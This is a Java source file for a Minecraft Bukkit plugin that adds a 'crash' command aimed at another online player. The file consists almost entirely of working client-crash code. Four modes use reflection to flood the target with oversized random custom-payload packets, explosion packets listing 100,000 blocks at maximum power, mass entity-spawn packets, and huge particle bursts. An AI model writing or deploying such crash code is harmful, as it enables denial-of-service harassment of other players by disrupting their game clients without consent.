package ru.balance.GenAI.command.subcommands;

import org.bukkit.Bukkit;
import org.bukkit.Location;
import org.bukkit.Particle;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import ru.balance.GenAI.GenAI;
import ru.balance.GenAI.command.SubCommand;

import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.List;
import java.util.Random;

public class CrashCommand extends SubCommand {
    private final Random random = new Random();

    public CrashCommand(GenAI plugin) {
        super(plugin);
    }

    @Override
    public String getName() {
        return "crash";
    }

    @Override
    public String getDescription() {
        return plugin.getLocaleManager().getMessage("commands.crash.help-description");
    }

    @Override
    public String getUsage() {
        return plugin.getLocaleManager().getMessage("commands.crash.help-usage");
    }

    @Override
    public void execute(CommandSender sender, String[] args) {
        if (args.length < 1) {
            sender.sendMessage(plugin.getLocaleManager().getMessage("commands.crash.usage"));
            sender.sendMessage(plugin.getLocaleManager().getMessage("commands.crash.modes-description"));
            return;
        }

        Player target = Bukkit.getPlayer(args[0]);
        if (target == null) {
            sender.sendMessage(plugin.getLocaleManager().getMessage("commands.crash.player-not-found")
                .replace("%player%", args[0]));
            return;
        }

        if (target.equals(sender)) {
            sender.sendMessage(plugin.getLocaleManager().getMessage("commands.crash.cannot-crash-self"));
            return;
        }

        String modeStr = "custompayload";
        if (args.length >= 2) {
            modeStr = args[1].toLowerCase();
        }

        try {
            switch (modeStr) {
                case "entities":
                    crashViaEntities(target);
                    break;
                case "explosion":
                    crashViaExplosion(target);
                    break;
                case "particles":
                    crashViaParticles(target);
                    break;
                case "custompayload":
                    crashViaCustomPayload(target);
                    break;
                default:
                    sender.sendMessage(plugin.getLocaleManager().getMessage("commands.crash.unknown-mode"));
                    return;
            }

            sender.sendMessage(plugin.getLocaleManager().getMessage("commands.crash.success")
                .replace("%player%", target.getName())
                .replace("%mode%", modeStr));
            this.plugin.getLogger().info(sender.getName() + " initiated crash on " + target.getName() + " with " + modeStr);

        } catch (Exception e) {
            sender.sendMessage(plugin.getLocaleManager().getMessage("commands.crash.failed")
                .replace("%error%", e.getMessage()));
            this.plugin.getLogger().warning("Crash failed on " + target.getName() + ": " + e.getMessage());
        }
    }

    private Object getPlayerConnection(Object handle) throws Exception {
        try {
            return handle.getClass().getField("playerConnection").get(handle);
        } catch (Exception ex) {
            try {
                return handle.getClass().getField("connection").get(handle);
            } catch (Exception ex2) {
                Field[] fields = handle.getClass().getDeclaredFields();
                for (Field f : fields) {
                    f.setAccessible(true);
                    Object val = f.get(handle);
                    if (val != null && val.getClass().getSimpleName().toLowerCase().contains("connection")) {
                        return val;
                    }
                }
            }
        }
        return null;
    }

    private void crashViaCustomPayload(Player player) throws Exception {
        Object handle = player.getClass().getMethod("getHandle").invoke(player);
        Object connection = getPlayerConnection(handle);

        if (connection == null) return;

        try {
            Class<?> payloadClass = Class.forName("net.minecraft.server." + getNMSVersion() + ".PacketPlayOutCustomPayload");
            Class<?> keyClass = Class.forName("net.minecraft.server." + getNMSVersion() + ".MinecraftKey");
            Class<?> serializerClass = Class.forName("net.minecraft.server." + getNMSVersion() + ".PacketDataSerializer");
            Class<?> bufClass = Class.forName("io.netty.buffer.ByteBuf");

            Constructor<?> keyCon = keyClass.getConstructor(String.class);
            String[] keys = {"crash:exploit", "crash:overflow", "crash:corrupt", "genai:crash"};
            List<Object> keyObjects = new ArrayList<>();
            for (String k : keys) {
                keyObjects.add(keyCon.newInstance(k));
            }

            Constructor<?> bufCon = bufClass.getDeclaredConstructor();
            bufCon.setAccessible(true);

            for (int attempt = 0; attempt < 500; attempt++) {
                try {
                    Object buf = bufCon.newInstance();

                    byte[] data = new byte[100000 + random.nextInt(100000)];
                    random.nextBytes(data);

                    Method writeBytesMethod = bufClass.getMethod("writeBytes", byte[].class);
                    writeBytesMethod.invoke(buf, (Object) data);

                    Method writeIntMethod = bufClass.getMethod("writeInt", int.class);
                    writeIntMethod.invoke(buf, Integer.MAX_VALUE);
                    writeIntMethod.invoke(buf, random.nextInt());

                    Constructor<?> serCon = serializerClass.getConstructor(bufClass);
                    Object serializer = serCon.newInstance(buf);

                    Object selectedKey = keyObjects.get(random.nextInt(keyObjects.size()));
                    Constructor<?> packetCon = payloadClass.getConstructor(keyClass, serializerClass);
                    Object packet = packetCon.newInstance(selectedKey, serializer);

                    try {
                        Method sendMethod = connection.getClass().getMethod("sendPacket", payloadClass.getSuperclass());
                        sendMethod.invoke(connection, packet);
                    } catch (Exception e1) {
                        try {
                            Method sendMethod = connection.getClass().getMethod("sendPacket", payloadClass);
                            sendMethod.invoke(connection, packet);
                        } catch (Exception e2) {
                            try {
                                Method sendMethod = connection.getClass().getMethod("a", payloadClass.getSuperclass());
                                sendMethod.invoke(connection, packet);
                            } catch (Exception e3) {}
                        }
                    }
                } catch (Exception ignored) {}
                if (attempt % 50 == 0) Thread.sleep(10);
            }
        } catch (Exception e) {
        
            crashViaEntitiesFallback(player);
        }
    }

    private void crashViaEntities(Player player) throws Exception {
        Object handle = player.getClass().getMethod("getHandle").invoke(player);
        Object connection = getPlayerConnection(handle);

        if (connection == null) return;

        try {
            Class<?> entityTypes = Class.forName(getEntityTypesClass());
            Class<?> spawnLivingClass = Class.forName("net.minecraft.server." + getNMSVersion() + ".PacketPlayOutSpawnEntityLiving");
            Class<?> spawnClass = Class.forName("net.minecraft.server." + getNMSVersion() + ".PacketPlayOutSpawnEntity");

            Field[] typeFields = entityTypes.getFields();
            List<Object> types = new ArrayList<>();
            for (Field f : typeFields) {
                try {
                    types.add(f.get(null));
                } catch (Exception ignored) {}
            }

            for (int cycle = 0; cycle < 50; cycle++) {
                for (int i = 0; i < 100; i++) {
                    try {
                        Object type = types.get(random.nextInt(types.size()));
                        if (type != null) {
                            Object packet;
                            try {
                                packet = spawnLivingClass.getConstructor().newInstance();
                            } catch (Exception e) {
                                packet = spawnClass.getConstructor().newInstance();
                            }

                            try {
                                Method send = connection.getClass().getMethod("sendPacket", packet.getClass().getSuperclass());
                                send.invoke(connection, packet);
                            } catch (Exception e1) {
                                try {
                                    Method send = connection.getClass().getMethod("sendPacket", packet.getClass());
                                    send.invoke(connection, packet);
                                } catch (Exception e2) {
                                    try {
                                        Method send = connection.getClass().getMethod("a", packet.getClass().getSuperclass());
                                        send.invoke(connection, packet);
                                    } catch (Exception e3) {}
                                }
                            }
                        }
                    } catch (Exception ignored) {}
                }
                Thread.sleep(20);
            }
        } catch (Exception e) {
        
            crashViaEntitiesFallback(player);
        }
    }

    private void crashViaEntitiesFallback(Player player) {
    
        Location loc = player.getLocation();
        for (int wave = 0; wave < 20; wave++) {
            Bukkit.getScheduler().runTaskLater(plugin, () -> {
                try {
                    for (int i = 0; i < 50; i++) {
                        player.sendBlockChange(loc.clone().add(random.nextInt(20)-10, random.nextInt(10), random.nextInt(20)-10),
                            org.bukkit.Material.DIAMOND_BLOCK.createBlockData());
                    }
                } catch (Exception ignored) {}
            }, wave * 3L);
        }
    }

    private void crashViaExplosion(Player player) throws Exception {
        Object handle = player.getClass().getMethod("getHandle").invoke(player);
        Object connection = getPlayerConnection(handle);

        if (connection == null) return;

        String version = getNMSVersion();
        Class<?> explosionClass = Class.forName("net.minecraft.server." + version + ".PacketPlayOutExplosion");
        Class<?> blockPosClass = Class.forName("net.minecraft.server." + version + ".BlockPosition");
        Class<?> vecClass = Class.forName("net.minecraft.server." + version + ".Vec3D");

        Constructor<?> blockPosCon = blockPosClass.getConstructor(int.class, int.class, int.class);
        Constructor<?> vecCon = vecClass.getConstructor(double.class, double.class, double.class);


        try {
            for (int wave = 0; wave < 5; wave++) {
                List<Object> blockList = new ArrayList<>();
                for (int i = 0; i < 100000; i++) {
                    blockList.add(blockPosCon.newInstance(random.nextInt(1000), random.nextInt(256), random.nextInt(1000)));
                }

                Object vec = vecCon.newInstance(0.0, 0.0, 0.0);

                Location loc = player.getLocation();
                Constructor<?> explosionCon = explosionClass.getConstructor(double.class, double.class, double.class, float.class, List.class, vecClass);
                Object packet = explosionCon.newInstance(loc.getX(), loc.getY(), loc.getZ(), Float.MAX_VALUE, blockList, vec);

                try {
                    Method send = connection.getClass().getMethod("sendPacket", explosionClass.getSuperclass());
                    send.invoke(connection, packet);
                } catch (Exception e1) {
                    try {
                        Method send = connection.getClass().getMethod("sendPacket", explosionClass);
                        send.invoke(connection, packet);
                    } catch (Exception e2) {
                        try {
                            Method send = connection.getClass().getMethod("a", explosionClass.getSuperclass());
                            send.invoke(connection, packet);
                        } catch (Exception e3) {}
                    }
                }
                Thread.sleep(50);
            }
        } catch (Exception e) {
            Location loc = player.getLocation();
            for (int i = 0; i < 20; i++) {
                final int wave = i;
                Bukkit.getScheduler().runTaskLater(plugin, () -> {
                    try {
                        player.getWorld().createExplosion(loc, 10.0f, false, false);
                    } catch (Exception ignored) {}
                }, wave * 5L);
            }
        }
    }

    private void crashViaParticles(Player player) throws Exception {
        Location loc = player.getLocation();

        for (int wave = 0; wave < 50; wave++) {
            final int currentWave = wave;
            Bukkit.getScheduler().runTaskLater(plugin, () -> {
                try {
                    for (int i = 0; i < 100; i++) {
                        player.spawnParticle(Particle.EXPLOSION_HUGE, loc, 5000, 30, 30, 30, 0.1f);
                        player.spawnParticle(Particle.FLAME, loc, 5000, 30, 30, 30, 0.1f);
                        player.spawnParticle(Particle.SMOKE_NORMAL, loc, 5000, 30, 30, 30, 0.1f);
                    }
                } catch (Exception ignored) {}
            }, currentWave * 5L);
        }

        Bukkit.getScheduler().runTaskAsynchronously(plugin, () -> {
            try {
                Object handle = player.getClass().getMethod("getHandle").invoke(player);
                Object connection = getPlayerConnection(handle);

                if (connection == null) return;

                String version = getNMSVersion();
                Class<?> particleClass = Class.forName("net.minecraft.server." + version + ".PacketPlayOutWorldParticles");

                for (int i = 0; i < 1000; i++) {
                    try {
                        Constructor<?> con = particleClass.getConstructor();
                        Object packet = con.newInstance();
                        Method send = connection.getClass().getMethod("sendPacket", particleClass.getSuperclass());
                        send.invoke(connection, packet);
                        Thread.sleep(5);
                    } catch (Exception ignored) {}
                }
            } catch (Exception ignored) {}
        });
    }


    private String getNMSVersion() {
        String pkg = Bukkit.getServer().getClass().getPackage().getName();
        return pkg.substring(pkg.lastIndexOf('.') + 1);
    }

    private String getEntityTypesClass() {
        String ver = getNMSVersion();
        if (ver.startsWith("v1_17") || ver.startsWith("v1_18") || ver.startsWith("v1_19") || ver.startsWith("v1_20") || ver.startsWith("v1_21")) {
            return "net.minecraft.world.entity.EntityTypes";
        }
        return "net.minecraft.server." + ver + ".EntityTypes";
    }

    @Override
    public List<String> onTabComplete(CommandSender sender, String[] args) {
        List<String> suggestions = new ArrayList<>();

        if (args.length == 1) {
            String input = args[0].toLowerCase();
            for (Player p : Bukkit.getOnlinePlayers()) {
                if (p.getName().toLowerCase().startsWith(input)) {
                    suggestions.add(p.getName());
                }
            }
        } else if (args.length == 2) {
            String input = args[1].toLowerCase();
            String[] modes = {"entities", "explosion", "particles", "custompayload"};
            for (String m : modes) {
                if (m.startsWith(input)) {
                    suggestions.add(m);
                }
            }
        }

        return suggestions;
    }
}


